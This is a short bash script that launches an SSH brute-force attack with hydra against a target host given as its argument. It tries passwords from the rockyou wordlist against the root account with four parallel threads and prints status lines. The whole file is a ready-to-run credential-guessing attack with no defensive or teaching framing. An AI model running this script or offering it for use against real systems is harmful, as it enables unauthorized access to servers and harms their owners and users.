#!/bin/bash

TARGET=$1
USER=root
WORDLIST=/usr/share/wordlists/rockyou.txt

echo "[+] Starting SSH brute force against $TARGET"

hydra -l $USER -P $WORDLIST ssh://$TARGET -t 4 -V

echo "[+] Attack completed"
